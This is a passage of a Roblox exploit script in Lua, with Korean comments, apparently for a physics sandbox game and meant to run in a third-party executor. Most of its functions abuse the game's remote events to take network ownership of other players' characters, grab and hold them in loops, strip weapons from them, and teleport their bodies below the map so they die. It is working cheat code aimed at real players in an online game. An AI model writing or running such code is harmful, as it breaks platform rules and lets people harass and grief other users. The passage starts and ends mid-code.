        end
    end

local function toggleTPUI(state)
    tpEnabled = state
    if state then
        tpGui = Instance.new("ScreenGui")
        tpGui.Name = "AlpacaMobileTPSystem"
        tpGui.Parent = game.CoreGui -- Delta/Xeno/ 등 실행기가 CoreGui 권한을 가짐
        
       
        local tpBtn = Instance.new("TextButton")
        tpBtn.Name = "ElegantMobileTPButton"
        tpBtn.Parent = tpGui
        
        
        tpBtn.Position = UDim2.new(1, -127, 1, -127) 
        tpBtn.Size = UDim2.new(0, 60, 0, 60) 
        
       
        tpBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20) 
        tpBtn.BackgroundTransparency = 0.4
        tpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        tpBtn.Text = "TP"
        tpBtn.Font = Enum.Font.SourceSansBold
        tpBtn.TextSize = 17
        tpBtn.BorderSizePixel = 0
        
        local uiCornerBtn = Instance.new("UICorner")
        uiCornerBtn.CornerRadius = UDim.new(1, 0) 
        uiCornerBtn.Parent = tpBtn
        
        
        local uiStroke = Instance.new("UIStroke")
        uiStroke.Color = Color3.fromRGB(0, 217, 255) 
        uiStroke.Thickness = 2.5
        uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        uiStroke.Parent = tpBtn

        
        tpBtn.MouseButton1Click:Connect(performTeleport)
    else
        if tpGui then tpGui:Destroy() tpGui = nil end
    end
end


    task.spawn(function()
        rs:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction"):InvokeServer(
            "CreatureBlobman", 
            CFrame.new(0,9999999,0), 
            Vector3.new(0,9999999,0)
        )
    end)

    task.delay(0.1, function()
         newInv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
         newBlob = newInv and newInv:FindFirstChild("CreatureBlobman")
        if newBlob then
             seat = newBlob:FindFirstChildOfClass("VehicleSeat")
            if seat and seat.Occupant == nil and humanoid then
                seat:Sit(humanoid)
            end
        end
        BLOBSIT = false
    end)
end

local function getClosestPlayer(targetPart)
    local closest, distance = nil, math.huge
    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= plr and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local mag = (targetPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
            if mag < distance then
                distance = mag
                closest = player
            end
        end
    end
    return closest
end

function AntiBurn()
    task.spawn(function()
        local EP = workspace:WaitForChild("Map"):WaitForChild("Hole"):WaitForChild("PoisonSmallHole"):WaitForChild("ExtinguishPart")
        while AntiBurnV do
            local hrp = plr.Character:WaitForChild("Head") -- HumanoidRootPart
            if hrp then
                EP.Transparency = 1
                EP.CastShadow = false
                if EP:FindFirstChild("Tex") then
                    EP.Tex.Transparency = 1
                end
                EP.Size = Vector3.new(0, 0, 0)
                EP.CFrame = hrp.CFrame
                task.wait()
                EP.CFrame = hrp.CFrame * CFrame.new(0,3,0)
            end
            task.wait()
        end
        EP.Size = Vector3.new(103.90400695800781, 7.5, 95.14202880859375)
        EP.CFrame = CFrame.new(157.075317, -58.8218384, 287.346954, -1.1920929e-07, 0, -1.00000012, 0, 1, 0, 1.00000012, 0, -1.1920929e-07)
        EP.Transparency = 0.5
        EP.CastShadow = true
        if EP:FindFirstChild("Tex") then
            EP.Tex.Transparency = 0
        end
    end)
end

local function teleportParts(player, partName)
    local character = player.Character
    if not character then return end
    
    local targetParts = {}

    if partName == "Arm/Leg" then
        table.insert(targetParts, character:FindFirstChild("Left Leg"))
        table.insert(targetParts, character:FindFirstChild("Right Leg"))
        table.insert(targetParts, character:FindFirstChild("Left Arm"))
        table.insert(targetParts, character:FindFirstChild("Right Arm"))

    elseif partName == "All/Leg" then
        table.insert(targetParts, character:FindFirstChild("Left Leg"))
        table.insert(targetParts, character:FindFirstChild("Right Leg"))

    elseif partName == "All/Arm" then
        table.insert(targetParts, character:FindFirstChild("Left Arm"))
        table.insert(targetParts, character:FindFirstChild("Right Arm"))

    elseif partName == "Leg/왼쪽" then
        table.insert(targetParts, character:FindFirstChild("Left Leg"))

    elseif partName == "Leg/오른쪽" then
        table.insert(targetParts, character:FindFirstChild("Right Leg"))

    elseif partName == "Arm/왼쪽" then
        table.insert(targetParts, character:FindFirstChild("Left Arm"))

    elseif partName == "Arm/오른쪽" then
        table.insert(targetParts, character:FindFirstChild("Right Arm"))
    end

    for _, part in ipairs(targetParts) do
        if part then part.CFrame = CFrame.new(0, -99999, 0) end
    end

    task.wait(0.03)
    local torso = character:FindFirstChild("Torso")
    if torso then torso.CFrame = CFrame.new(0, -99999, 0) end
end

function TP(target)
    local TCHAR = target.Character
    --local THRP = TCHAR:FindFirstChild("HumanoidRootPart")
    local THRP = TCHAR:FindFirstChild("Torso")

    local localChar = plr.Character
    local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")

    if TCHAR and THRP and localHRP then
        local ping = game:GetService("Players").LocalPlayer:GetNetworkPing()
        local offset = THRP.Position + (THRP.Velocity * (ping + 0.15))

        localHRP.CFrame = CFrame.new(offset) * THRP.CFrame.Rotation

        return true
    end
    return false
end

function SetOwner(target)
	local head = target.Character:FindFirstChild("HumanoidRootPart")
	if head and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
		rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
		return true
	end
	return false
end

function UnOwner(target)
	local head = target.Character:FindFirstChild("HumanoidRootPart")
	if head and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
		rs.GrabEvents.DestroyGrabLine:FireServer(head, head.CFrame)
		return true
	end
	return false
end

function BACK(originCF)
	if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
		plr.Character.HumanoidRootPart.CFrame = originCF
	end
end

local function safeGetCharacterParts(player)
    if not player then return nil end
    local char = player.Character
    if not char then return nil end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local head = char:FindFirstChild("Head")
    return char, hrp, head
end

function loopPlayerBlobF() -- 블롭 룹1
    UpdateCurrentBlobman()

    local seat = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").SeatPart
    if not (seat and seat.Parent and seat.Parent.Name == "CreatureBlobman") then
        return false
    end

    local isRiding = seat and seat.Parent and seat.Parent.Name == "CreatureBlobman"

    local processedHumanoids = {}

    local function processPlayer(player)
        if not player then return false end

        local character, hrp, head = safeGetCharacterParts(player)
        if not hrp or not head then return false end

        if hrp.Massless == true and not isRiding then
            return false
        end

        local myChar = plr and plr.Character
        local myHrp = myChar:FindFirstChild("HumanoidRootPart")
        if not myHrp then return false end
        local originCF = myHrp.CFrame

        local tpRunning = true
        task.spawn(function()
            while tpRunning do
                local ok, cf = TP(player)
                if ok and cf then
                    CF = cf
                end
                task.wait()
            end
        end)

        while blobLoopT do
            rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)

            local ownerTag = head:FindFirstChild("PartOwner")
            if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                break
            end
            task.wait()
        end

        tpRunning = false

        local targetNames = { "NinjaKunai", "NinjaShuriken", "NinjaKatana", "ToolCleaver", "ToolDiggingForkRusty", "ToolPencil", "ToolPickaxe" }
        for _, child in ipairs(workspace:GetChildren()) do
            if child:IsA("Folder") and child.Name:match("SpawnedInToys$") then
                for _, item in ipairs(child:GetChildren()) do
                    if table.find(targetNames, item.Name) and item:FindFirstChild("StickyPart") then
                        local sticky = item.StickyPart
                        local weld = sticky:FindFirstChild("StickyWeld")
                        if weld and weld:IsA("WeldConstraint") and weld.Part1 then
                            local targetParts = {
                                character:FindFirstChild("Head"),
                                character:FindFirstChild("Torso"),
                                character:FindFirstChild("Left Arm"),
                                character:FindFirstChild("Left Leg"),
                                character:FindFirstChild("Right Arm"),
                                character:FindFirstChild("Right Leg"),
                                hrp:FindFirstChild("RagdollTouchedHitbox"),
                                hrp:FindFirstChild("FirePlayerPart"),
                            }
                            for _, tPart in ipairs(targetParts) do
                                if tPart and weld.Part1 == tPart then
                                    local basePart = item.PrimaryPart or sticky
                                    if basePart and (basePart.Position - hrp.Position).Magnitude <= 10 then
                                        rs.GrabEvents.SetNetworkOwner:FireServer(sticky, sticky.CFrame)
                                        sticky.CFrame = CFrame.new(0,9999,0)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end

        rs.GrabEvents.DestroyGrabLine:FireServer(head, head.CFrame)

	hrp.CFrame = CFrame.new(myHrp.CFrame.X, myHrp.CFrame.Y +50, myHrp.CFrame.Z)
	myHrp.CFrame = hrp.CFrame
        BlobMassless(currentBlobS, hrp, "Right")

        if originCF then
            BACK(originCF)
        end

        return true
    end

    task.spawn(function()
        while blobLoopT do
            for i, name in ipairs(playersInLoop2V) do
                local player = game.Players:FindFirstChild(name)
                if not player then --or table.find(Whitelist, name) then
                    continue
                end

                if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then
                    continue
                end

                local character = player.Character
                local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                local hrp = character and character:FindFirstChild("HumanoidRootPart")

                if hrp and hrp:IsA("BasePart") and hrp.Massless and not isRiding then
                    continue
                end

                if humanoid and humanoid.Health > 0 then
                    if processedHumanoids[player] ~= humanoid then
                        local success = processPlayer(player)
                        if success then
                            processedHumanoids[player] = humanoid
                        end
                    end
                else
                    processedHumanoids[player] = nil
                end
                task.wait(0.05)
            end
            task.wait(0.3)
        end
    end)
end

function loopPlayerBlobF2() -- 블롭 룹2
    UpdateCurrentBlobman()

    local seat = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").SeatPart
    if not (seat and seat.Parent and seat.Parent.Name == "CreatureBlobman") then
        return false
    end

    local isRiding = seat and seat.Parent and seat.Parent.Name == "CreatureBlobman"

    local function processPlayer(player)
        if not player then return false end

        local _, hrp, head = safeGetCharacterParts(player)
        if not hrp or not head then return false end

        local character = player.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        if not humanoid or humanoid.Health <= 0 then return false end

if hrp then
            BlobGrab(currentBlobS, hrp, "Right")
            BlobRelease(currentBlobS, hrp, "Right")
            if LoopBringMODED then humanoid.Sit = true end
			if LoopReleaseMODED and player.InPlot.Value then hrp.CFrame = CFrame.new(0, 500, 0) end
            task.wait(0.03)
            BlobGrab(currentBlobS, hrp, "Right")
            if LoopBringMODED then humanoid.Sit = false end
			if LoopReleaseMODED and player.InPlot.Value then hrp.CFrame = CFrame.new(0, 500, 0) end
        end

        return true
    end

    task.spawn(function()
        while blobLoopT2 do
            for i, name in ipairs(playersInLoop2V) do
                local player = game.Players:FindFirstChild(name)
                if not player then --or table.find(Whitelist, name) then
                    continue
                end

                if PPs:FindFirstChild(name) then
                    continue
                end

                local character = player.Character
                local hrp = character and character:FindFirstChild("HumanoidRootPart")

                if hrp.Massless == true and not isRiding then
                    continue
                end

                processPlayer(player)
                task.wait(0.01)
            end
            task.wait(0.01)
        end
    end)
end
function loopPlayerBlobF3() -- 블롭 룹3

    UpdateCurrentBlobman()

    local seat = plr.Character
        and plr.Character:FindFirstChildOfClass("Humanoid")
        and plr.Character:FindFirstChildOfClass("Humanoid").SeatPart

    if not (seat and seat.Parent and seat.Parent.Name == "CreatureBlobman") then
        return false
    end

    local runningTasks = {}

    local function waitForRespawn(player)
        while blobLoopT3 do
            local char = player.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 then
                return char
            end
            task.wait(0.01)
        end
    end

    task.spawn(function()
        while blobLoopT3 do
            for _, name in ipairs(playersInLoop2V) do
                if not blobLoopT3 then break end

                local player = game.Players:FindFirstChild(name)
                if not player then continue end
                if PPs and PPs:FindFirstChild(name) then continue end
                if runningTasks[player] then continue end

                runningTasks[player] = task.spawn(function()
                    local beforeTP

                    while blobLoopT3 do
                        local myChar = plr.Character
                        local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
                        if not myHrp then task.wait(0.1) continue end

                        if not beforeTP then
                            beforeTP = myHrp.CFrame
                        end

                        local char = player.Character
                        local hum = char and char:FindFirstChildOfClass("Humanoid")

                        if hum and hum.Health <= 0 then
                            if beforeTP then
                                BACK(beforeTP)
                            end

                            waitForRespawn(player)

                            local myChar2 = plr.Character
                            local myHrp2 = myChar2 and myChar2:FindFirstChild("HumanoidRootPart")
                            if myHrp2 then
                                beforeTP = myHrp2.CFrame
                            end

                            continue
                        end

                        if not hum then
                            task.wait(0.05)
                            continue
                        end

                        local hrp = char:FindFirstChild("HumanoidRootPart")
                        if not hrp then task.wait(0.05) continue end

                        local distance = (myHrp.Position - hrp.Position).Magnitude
                        if distance > 30 then
                            TP(player)
                            task.wait(0.05)
                            continue
                        end

                        hum.BreakJointsOnDeath = false
                        hum.WalkSpeed = 0
                        hum.JumpPower = 0

                        for i = 0, 0 do
                            if hum.SeatPart == nil then
                                if hum.RigType ~= Enum.HumanoidRigType.R15 then
                                    hum.RigType = Enum.HumanoidRigType.R15
                                end

                                if hum.RigType ~= Enum.HumanoidRigType.R6 then
                                    hum.RigType = Enum.HumanoidRigType.R6
                                end

                                if hum.RigType ~= Enum.HumanoidRigType.R15 then
                                    hum.RigType = Enum.HumanoidRigType.R15
                                end

                            end
                            task.wait()
                        end

                        for i = 1, 3 do
                            if not blobLoopT3 then break end
                            BlobGrab(currentBlobS, hrp, "Right")
                            BlobRelease(currentBlobS, hrp, "Right")
                            task.wait()
                        end

                        task.wait()
                    end

                    if beforeTP then
                        BACK(beforeTP)
                    end

                    runningTasks[player] = nil
                end)

                task.wait()
            end

            task.wait()
        end

        for _, t in pairs(runningTasks) do
            task.cancel(t)
        end
        runningTasks = {}
    end)
end

local RunService = game:GetService("RunService")
local destroyCount = 0
OwnerKickMODED = false
SitMODED = false
OnlyOwner = false
SkipOL = false
OLTPValue = Vector3.new(0, 20, 0)


function loopPlayerBlobF4()
    UpdateCurrentBlobman()

    local runningTasks = {}
    local monitoredPlayers = {}
    local independentHoldConnections = {}
    local anchorToggleTasks = {}
    local ownerTags = {}
    local originPositions = {}

    local function processPlayer(player)
        if not player then return end

        while blobLoopT4 do
            if not player.Parent then
                monitoredPlayers[player] = nil
                independentHoldConnections[player] = nil
                if anchorToggleTasks[player] then
                    task.cancel(anchorToggleTasks[player])
                    anchorToggleTasks[player] = nil
                end
                if ownerTags[player] then
                    ownerTags[player]:Destroy()
                    ownerTags[player] = nil
                end
                if originPositions[player] then
                    originPositions[player] = nil
                end
                if player.Character then
                    local charHRP = player.Character:FindFirstChild("HumanoidRootPart")
                    if charTOR then
                        charTOR.Anchored = false
                    end
                end
                return
            end

            local character = player.Character
            while blobLoopT4 and (not character or not character:FindFirstChild("Humanoid")) do
                if not player.Parent then return end
                task.wait(0.5)
                character = player.Character
            end

            local charHUM = character and character:FindFirstChild("Humanoid")
            if not charHUM then
                task.wait(0.5)
                continue
            end

            if not originPositions[player] then
                local myChar = plr.Character
                local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                if myHRP then
                    originPositions[player] = myHRP.CFrame
                end
            end

            while blobLoopT4 and charHUM and charHUM.Health <= 0 do
                if not player.Parent then return end
                if ownerTags[player] then
                    ownerTags[player]:Destroy()
                    ownerTags[player] = nil
                end

                local myChar = plr.Character
                local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                if myHRP and originPositions[player] then
                    myHRP.CFrame = originPositions[player]
                end

                if independentHoldConnections[player] then
                    independentHoldConnections[player]:Disconnect()
                    independentHoldConnections[player] = nil
                end
                
                if anchorToggleTasks[player] then
                    task.cancel(anchorToggleTasks[player])
                    anchorToggleTasks[player] = nil
                end
                
                task.wait(0.5)
                character = player.Character
                charHUM = character and character:FindFirstChild("Humanoid")
            end

            local _, safeHRP, head = safeGetCharacterParts(player)
            if not safeHRP or not head then
                task.wait(0.5)
                continue
            end

            local myChar = plr.Character
            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myHRP then
                task.wait(0.5)
                continue
            end

            local charHRP = character:FindFirstChild("HumanoidRootPart")
            local charTOR = character:FindFirstChild("Torso")
            if not charHRP then
                task.wait(0.5)
                continue
            end

            local tpRunning = true
            local CF
            task.spawn(function()
                while tpRunning and blobLoopT4 do
                    if not player.Parent then break end
                    local ok, cf = TP(player)
                    if ok and cf then 
                        CF = cf
                    end
                    task.wait()
                end
            end)

            local shouldContinue = false
            while blobLoopT4 do
                if not character.Parent or not charHUM or charHUM.Health <= 0 then 
                    tpRunning = false
                    shouldContinue = true

                    local myChar = plr.Character
                    local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if myHRP and originPositions[player] then
                        myHRP.CFrame = originPositions[player]
                    end
                    break
                end

                local mySeat = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").SeatPart
                local amIRiding = mySeat and mySeat.Parent and mySeat.Parent.Name == "CreatureBlobman"

                local ownerTag = head:FindFirstChild("PartOwner")
                if not ownerTag or (ownerTag:IsA("StringValue") and ownerTag.Value ~= plr.Name) then
                    rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
                    if charHRP then rs.GrabEvents.SetNetworkOwner:FireServer(charHRP, charHRP.CFrame) end
                end

                if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                    break
                else
                    if charHRP then
                        charHRP.Velocity = Vector3.new(0,0,0)
                        charHRP.RotVelocity = Vector3.new(0,0,0)
                    end
                    if amIRiding then
                        BlobGrab(currentBlobS, charHRP, "Right")
                        BlobRelease(currentBlobS, charHRP, "Right")
                    end
                    if amIRiding and charHUM then
                        charHUM.Sit = true
                        charHUM.Sit = false
                    end
                end
                task.wait()
            end

            if not shouldContinue then
                tpRunning = false

                local targetCFrame
                if CF then
                    targetCFrame = CF
                    BACK(CF)
                elseif originPositions[player] then
                    targetCFrame = originPositions[player]
                    BACK(originPositions[player])
                end

                if anchorToggleTasks[player] then
                    task.cancel(anchorToggleTasks[player])
                    anchorToggleTasks[player] = nil
                end

                if not ownerTags[player] then
                    local tag = Instance.new("StringValue")
                    tag.Name = "OwnerKickRagdoll"
                    tag.Parent = head
                    ownerTags[player] = tag
                end

                local targetNames = {"NinjaKunai","NinjaShuriken","NinjaKatana","ToolCleaver","ToolDiggingForkRusty","ToolPencil","ToolPickaxe"}
                for _, child in ipairs(workspace:GetChildren()) do
                    if child:IsA("Folder") and child.Name:match("SpawnedInToys$") then
                        for _, item in ipairs(child:GetChildren()) do
                            if table.find(targetNames, item.Name) and item:FindFirstChild("StickyPart") then
                                local sticky = item.StickyPart
                                local weld = sticky:FindFirstChild("StickyWeld")
                                if weld and weld:IsA("WeldConstraint") and weld.Part1 and weld.Part1:IsDescendantOf(character) then
                                    rs.GrabEvents.SetNetworkOwner:FireServer(sticky, sticky.CFrame)
                                    sticky.CFrame = CFrame.new(0,9999,0)
                                end
                            end
                        end
                    end
                end

                if independentHoldConnections[player] then
                    independentHoldConnections[player]:Disconnect()
                    independentHoldConnections[player] = nil
                end

                independentHoldConnections[player] = RunService.Heartbeat:Connect(function()
                    if not blobLoopT4 or not character or not character.Parent or not charHRP or not charHRP.Parent or not charHUM or charHUM.Health <= 0 then
                        if independentHoldConnections[player] then 
                            independentHoldConnections[player]:Disconnect()
                            independentHoldConnections[player] = nil
                            destroyCounts[player] = nil
                        end
                        if anchorToggleTasks[player] then
                            task.cancel(anchorToggleTasks[player])
                            anchorToggleTasks[player] = nil
                        end
                        if ownerTags[player] then
                            ownerTags[player]:Destroy()
                            ownerTags[player] = nil
                        end
                        if charTOR then
                            charTOR.Anchored = false
                        end

                        local myChar = plr.Character
                        local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                        if myHRP and originPositions[player] then
                            myHRP.CFrame = originPositions[player]
                        end
                        
                        return
                    end

                    charHRP.Velocity = Vector3.new(0,0,0)
                    charHRP.RotVelocity = Vector3.new(0,0,0)

                    local currentSeat = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").SeatPart
                    local isRidingNow = currentSeat and currentSeat.Parent and currentSeat.Parent.Name == "CreatureBlobman"

                    if not isRidingNow and not OwnerKickMODED then
                        if not charHUM.Sit  and not OnlyOwner then rs.GrabEvents.SetNetworkOwner:FireServer(charHRP, CFrame.lookAt(myHRP.Position, charHRP.Position)) end
                        if charHUM.Sit and not OnlyOwner then rs.GrabEvents.DestroyGrabLine:FireServer(charHRP) end
                        if player.IsHeld then rs.GrabEvents.SetNetworkOwner:FireServer(charHRP, CFrame.lookAt(myHRP.Position, charHRP.Position)) end
                        if charHUM.Sit and not OnlyOwner then rs.GrabEvents.DestroyGrabLine:FireServer(charHRP) end
                    end
                    if not isRidingNow and OwnerKickMODED then
                        rs.GrabEvents.SetNetworkOwner:FireServer(charHRP, CFrame.lookAt(myHRP.Position, charHRP.Position))
                        if not OnlyOwner then rs.GrabEvents.DestroyGrabLine:FireServer(charHRP) end
                        if SitMODED then charHUM.Sit = true end
                    end
                    if isRidingNow then
                        rs.GrabEvents.SetNetworkOwner:FireServer(charHRP, CFrame.lookAt(myHRP.Position, charHRP.Position))
                        if not OnlyOwner then rs.GrabEvents.DestroyGrabLine:FireServer(charHRP) end
                        if SitMODED then  charHUM.Sit = true end
                    end

                    local activeKicking = {}
                    for p, t in pairs(runningTasks) do
                        if t and p.Parent and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and ownerTags[p] then
                            table.insert(activeKicking, p)
                        end
                    end
                    table.sort(activeKicking, function(a, b) return a.Name < b.Name end)

                    local targetPosition
                    if #activeKicking <= 1 then
                        targetPosition = myHRP.CFrame * CFrame.new(OLTPValue)
                    else
                        local index = table.find(activeKicking, player) or 1
                        local count = #activeKicking
                        local angle = (index - 1) * (2 * math.pi / count)
                        local radius = 20
                        local offset = Vector3.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
                        targetPosition = (myHRP.CFrame * CFrame.new(OLTPValue)) * CFrame.new(offset)
                    end

                    charHRP.CFrame = targetPosition
                end)

                if SkipOL then task.wait(2) end

                anchorToggleTasks[player] = task.spawn(function()
                    while blobLoopT4 and character and character.Parent and charHRP and charHRP.Parent and charHUM and charHUM.Health > 0 do
                        if charTOR and SkipOL then charTOR.Anchored = true end
                        task.wait()
                    end
                end)

                while blobLoopT4 do
                    if not character.Parent or not charHRP.Parent or charHUM.Health <= 0 then 
                        if independentHoldConnections[player] then
                            independentHoldConnections[player]:Disconnect()
                            independentHoldConnections[player] = nil
                        end
                        if anchorToggleTasks[player] then
                            task.cancel(anchorToggleTasks[player])
                            anchorToggleTasks[player] = nil
                        end
                        if ownerTags[player] then
                            ownerTags[player]:Destroy()
                            ownerTags[player] = nil
                        end
                        if charTOR then
                            charTOR.Anchored = false
                        end

                        local myChar = plr.Character
                        local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                        if myHRP and originPositions[player] then
                            myHRP.CFrame = originPositions[player]
                        end
                        
                        break 
                    end

                    local currentSeat = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").SeatPart
                    if currentSeat and currentSeat.Parent and currentSeat.Parent.Name == "CreatureBlobman" then
                        charHRP.Velocity = Vector3.new(0,0,0)
                        BlobGrab(currentBlobS, charHRP, "Right")
                        BlobRelease(currentBlobS, charHRP, "Right")
                        charHUM.Sit = true
                        task.delay(0, function() if charHUM then charHUM.Sit = false end end)
                    end
                    task.wait()
                end

                if independentHoldConnections[player] then 
                    independentHoldConnections[player]:Disconnect()
                    independentHoldConnections[player] = nil
                end

                if anchorToggleTasks[player] then
                    task.cancel(anchorToggleTasks[player])
                    anchorToggleTasks[player] = nil
                end

                if ownerTags[player] then
                    ownerTags[player]:Destroy()
                    ownerTags[player] = nil
                end

                if charTOR then
                    charTOR.Anchored = false
                end

                local myChar = plr.Character
                local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                if myHRP and originPositions[player] then
                    myHRP.CFrame = originPositions[player]
                end
            end

            if originPositions[player] then
                originPositions[player] = nil
            end
            
            task.wait(0.35)
        end
    end

    task.spawn(function()
        while blobLoopT4 do
            local targetList = {}
            if playersInLoop1V then for _, v in pairs(playersInLoop1V) do table.insert(targetList, v) end end
            if playersInLoop2V then for _, v in pairs(playersInLoop2V) do table.insert(targetList, v) end end

            for _, name in ipairs(targetList) do
                local player = game.Players:FindFirstChild(name)
                if not player or player == plr then continue end
                if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then continue end

                if not monitoredPlayers[player] then
                    monitoredPlayers[player] = true
                    if not runningTasks[player] then
                        runningTasks[player] = task.spawn(function()
                            pcall(function() processPlayer(player) end)
                            runningTasks[player] = nil
                            monitoredPlayers[player] = nil
                            if independentHoldConnections[player] then
                                independentHoldConnections[player]:Disconnect()
                                independentHoldConnections[player] = nil
                            end
                            if anchorToggleTasks[player] then
                                task.cancel(anchorToggleTasks[player])
                                anchorToggleTasks[player] = nil
                            end
                            if ownerTags[player] then
                                ownerTags[player]:Destroy()
                                ownerTags[player] = nil
                            end
                            if originPositions[player] then
                                originPositions[player] = nil
                            end
                            destroyCounts[player] = nil
                            if player.Character then
                                local charHRP = player.Character:FindFirstChild("HumanoidRootPart")
                                if charTOR then
                                    charTOR.Anchored = false
                                end
                            end
                        end)
                    end
                end
            end

            for player, taskInfo in pairs(runningTasks) do
                if not player.Parent then
                    task.cancel(taskInfo)
                    runningTasks[player] = nil
                    monitoredPlayers[player] = nil
                    if independentHoldConnections[player] then
                        independentHoldConnections[player]:Disconnect()
                        independentHoldConnections[player] = nil
                    end
                    if anchorToggleTasks[player] then
                        task.cancel(anchorToggleTasks[player])
                        anchorToggleTasks[player] = nil
                    end
                    if ownerTags[player] then
                        ownerTags[player]:Destroy()
                        ownerTags[player] = nil
                    end
                    if originPositions[player] then
                        originPositions[player] = nil
                    end
                    destroyCounts[player] = nil
                    if player.Character then
                        local charHRP = player.Character:FindFirstChild("HumanoidRootPart")
                        if charTOR then
                            charTOR.Anchored = false
                        end
                    end
                end
            end
            task.wait(0.5)
        end

        for player, task in pairs(anchorToggleTasks) do
            if task then
                task.cancel(task)
            end
        end

        for _, taskInfo in pairs(runningTasks) do task.cancel(taskInfo) end
        for player, connection in pairs(independentHoldConnections) do
            if connection then connection:Disconnect() end
        end

        for player, tag in pairs(ownerTags) do
            if tag then
                tag:Destroy()
            end
        end
        ownerTags = {}

        for player, originCF in pairs(originPositions) do
            local myChar = plr.Character
            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if myHRP and originCF then
                myHRP.CFrame = originCF
            end
        end
        originPositions = {}

        for _, player in ipairs(game.Players:GetPlayers()) do
            if player.Character then
                local charHRP = player.Character:FindFirstChild("HumanoidRootPart")
                if charTOR then
                    charTOR.Anchored = false
                end
            end
        end

        runningTasks = {}
        monitoredPlayers = {}
        independentHoldConnections = {}
        anchorToggleTasks = {}
        destroyCounts = {}
    end)
end



function loopPlayerF() -- 룹1
    UpdateCurrentBlobman()

    local currentProcessing = {}

    local function processPlayer(player)
        if not player then return false end

        local character, hrp, head = safeGetCharacterParts(player)
        if not hrp or not head then return false end

        local myChar = plr and plr.Character
        local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myHrp then return false end
        local originCF = myHrp.CFrame

        local tpRunning = true
        task.spawn(function()
            while tpRunning do
                local ok, cf = TP(player)
                if ok and cf then
                    CF = cf
                end
                task.wait()
            end
        end)

        while loopPlayerT do
            if not player or not player.Character or not player.Character:FindFirstChild("Head") then break end
            
            rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
            local ownerTag = head:FindFirstChild("PartOwner")
            if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                break
            end
            task.wait()
        end

        tpRunning = false

        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        if humanoid then

            rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
            rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
            rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)

            if humanoid.RigType ~= Enum.HumanoidRigType.R15 and humanoid.SeatPart == nil then humanoid.RigType = Enum.HumanoidRigType.R15 end

            if humanoid.BreakJointsOnDeath == true and humanoid.SeatPart == nil then humanoid.BreakJointsOnDeath = false end

            if head:FindFirstChildOfClass("BallSocketConstraint") then head.BallSocketConstraint.Attachment0 = nil end

            local FallenY = workspace.FallenPartsDestroyHeight
            local targetY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -100
            local storso = character:FindFirstChild("Torso")
            local ownerTag = head:FindFirstChild("PartOwner")

            if storso then --and ownerTag.Value == plr.Name then
                storso.CFrame = CFrame.new(storso.Position.X, targetY, storso.Position.Z)
            end
        end

        if originCF then BACK(originCF) end
        return true
    end

    task.spawn(function()
        while loopPlayerT do
            for _, name in ipairs(playersInLoop2V) do
                local player = game.Players:FindFirstChild(name)

                if player and not table.find(Whitelist, player.Name) then
                    if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then continue end

                    local character = player.Character
                    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

                    if humanoid and humanoid.Health > 0 then
                        if not currentProcessing[player] then
                            currentProcessing[player] = true

                            task.spawn(function()
                                local success = processPlayer(player)

                                if success then
                                    task.wait(2)
                                end

                                currentProcessing[player] = nil
                            end)
                        end
                    else
                        currentProcessing[player] = nil
                    end
                else
                    if player then
                        currentProcessing[player] = nil
                    end
                end
            end
            task.wait(0.05)
        end
    end)
end

function loopPlayerF2() -- 룹2
    UpdateCurrentBlobman()

    local processedHumanoids = {}

    local function processPlayer(player)
        if not player then return false end

        local character, hrp, head = safeGetCharacterParts(player)
        if not hrp or not head then return false end

